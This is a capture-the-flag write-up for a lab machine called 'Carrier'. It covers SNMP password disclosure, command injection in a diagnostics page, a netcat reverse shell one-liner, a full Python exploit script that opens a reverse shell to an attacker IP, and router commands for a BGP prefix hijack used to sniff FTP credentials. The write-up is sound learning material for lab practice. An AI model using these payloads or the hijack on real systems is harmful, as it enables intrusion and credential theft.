 > After scanning Directories with dirsearch I found a pdf file which contains the explanation of the error codes which where shown on the main page of the site.

45009 --> System credentials have been setDefault admin user password is set (see chassis serial number)

> As udp port scan shows that the snmp port 161 is up. I used snmpwalk right away!

$ snmpwalk -c public -v 2c 10.10.10.105

iso.3.6.1.2.1.47.1.1.1.1.11 = No more variables left in this MIB View (It is past the end of the MIB tree)   
```
> This revealed string that contains the password. First i tried the whole string as "SN#NET_45JDX23" which did not worked, after that I thought why not to try only "NET_45JDX23", Which actually worked with the user admin.

#### Ticket Page note says:

> Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end.
Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15:
CastCom. still reporting issues with 3 networks: 10.120.15,  10.120.16,  10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating...
Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.   

#### Command Injection:

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=cXVhZ2dh' \
    --data-binary $'check=| nc 10.10.13.255 1337' \
    $'http://10.10.10.105/diag.php'  
```

> Which out the output of ps aux and also it was greping the quagga from it. so the command was like "ps aux | grep quagga". quagga was out base64 input from the post request and now we know that it is command injection.

payload:
`| whoami`

`base64-encode= YHwgd2hvYW1pYA==`

```
curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Referer: http://10.10.10.105/diag.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=civdj8h94df0kj1smcf948q7v6' \
    --data-binary $'check=fCBjYXQgdXNlci50eHQ=' \
    $'http://10.10.10.105/diag.php'     
```    
And the output was `root`. So, Confirmed its was the command injection.

@ http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/

reverse shell payload:
`payload: rm f;mkfifo f;cat f|/bin/sh -i 2>&1|/bin/nc.openbsd 10.10.15.176 21 > f`

Curl request to get reverse shell

```
curl -i -s -k  -X $'POST' \

    $'http://10.10.10.105/diag.php'       

```

> After exploring a site bit I realised, Its getting very hard to reproduce every step again and again to get reverse shell, So I code a reverse shell exploit.


### Reverse shell exploit:

```python
import requests
import sys
import base64
import subprocess
import multiprocessing

index = "http://10.10.10.105/"
dashboard = "http://10.10.10.105/dashboard.php"
diag = "http://10.10.10.105/diag.php"
ip = sys.argv[1]
port = sys.argv[2]

cookies1 = {
    'PHPSESSID': '46i5r5qj18h6vl9rdp8so862v5',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0',
    'Referer': 'http://10.10.10.105/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Upgrade-Insecure-Requests': '1',
}

data = 'username=admin&password=NET_45JDX23'

def listner():
	print("[+] Listing on port 1447 ")
	subprocess.call("nc -lnvp {}".format(port) , shell=True)

with requests.Session() as box:

	#performing Login reqeust
	response = box.post(index, headers=headers, cookies=cookies1, data=data)
	#Reqeusting dashboard to get cookies
	dashboard = box.get(dashboard)
	#Second Post Request for Exploit
	payload = "| rm f;mkfifo f;cat f|/bin/sh -i 2>&1|/bin/nc.openbsd {} {} > f".format(ip,port)
	#base64 encode payload
	encoded_payload = base64.b64encode(payload)
	post_payload = "check={}".format(encoded_payload)
	#Final post request for exploit
	print("[+] Exploting it....!")
	process = multiprocessing.Process(target=listner)
	process.start()
	exploit = box.post(diag, headers=headers, cookies=cookies1, data=post_payload)
	print(exploit.status_code)

```

#### Spawing shell:

```
$ /bin/bash -i
```    

### @ BGP Prefix Hijack Attacks - ColoState

> Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking.
I wonâ€™t go through a detailed explanation about this attack because that will be off-topic ,
I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us ,
so if anybody tried to connect to that network they will connect to us.
This is possible because we are on the host that is responsible for routing.

Commands that helped me to route the servers:

```
> configure terminal

> access-list 50 permit 10.120.15.0 0.0.0.128   --> This is ftp server
> access-list 60 permit 10.78.10.0 0.0.0.128          --> thsese two guyes are our netwrok
> access-list 60 permit 10.78.10.128 0.0.0.128

> route-map to-as200 permit 10     
> match ip address 50         {Routing the AS200 to our ftp server}
> set community no-export         {Not sure why I used was mentioned In a vlog to use it after match command}
> route-map to-as200 permit 20

> route-map to-as300 deny 10       {We will deny the AS300 } {To ignore by the route map}
> match ip address 50
> route-map to-as300 permit 20
> match ip address 60
> set community no-export
> route-map to-as300 permit 30

> route bgp 100
> network 10.78.10.0/25
> network 10.78.10.128/25
> network 10.120.15.0/25
> exit
> exit
r1#clear ip bgp *
r1# exit
```

### Explanation of commands:

access-list:

> | Step 1 | enable Example: Device> enable |
> | Step 2 | configure terminal Example: Device# configure terminal |
> | Step 3 | access-list access-list-number permit {source [source-wildcard] | any} [log] Example: Device(config)# access-> list 1 permit 172.16.5.22 0.0.0.0 |

To distribute any routes that have a destination IP  network number address that is permitted by a standard access list, an  expanded access list, or a prefix list, use the match ip address command. To remove the match ip address entry, use the no form of this command.
match ip address {prefix-list prefix-list-name [prefix-list-name...]}

@ https://www.nongnu.org/quagga/docs/docs-multi/Route-Map-Match-Command.html

You must define a route map when specifying which of the routes from the specified routing protocol are allowed to be redistributed into the target routing process.
To define a route map, enter the following command:

route-map
Commad:
route-mapname {permit | deny} [sequence_number]
Explanation: Creates the route map entry. Enters route-map configuration mode

Example: Example:hostname(config)#route-map name {permit} [12]
Explanation: Route map entries are read in order. You can identify the order using the sequence_number argument, or the ASA uses the order in which you add route map entries

> Hi, I did this networking bgp stuff first time :( So please expect some mistakes! also it took me whole week to understand and exploit that bgp hijacking thing!

Now, All I have to do is to capture the packets.

$ root@carrier:~# tcpdump -i any -w root1.pcap -s 0 net 10.120.15.0/24

After going through the output of capture packets I found these credentials in it.

```
ftp password:BGPtelc0rout1ng
```

Finally, logged in to the ssh using these keys!

```
$ ssh root@10.10.10.105
$ root@carrier:~# cat /root/root.txt | wc -c
 33
 ```

Done, And we owned root !
